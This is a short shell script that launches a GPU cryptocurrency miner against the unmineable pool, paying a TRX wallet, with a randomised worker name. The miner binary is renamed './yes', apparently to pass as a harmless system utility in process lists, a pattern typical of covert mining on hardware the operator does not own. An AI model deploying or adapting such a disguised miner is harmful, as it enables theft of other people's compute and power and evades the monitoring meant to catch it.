POOL=rx-us.unmineable.com:3333
WALLET=TRX:TThcr8onLEsDGeKdW29w4W3aEPe9eyj7LE
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo rK8hd5eE-$(shuf -i 1911-993300 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
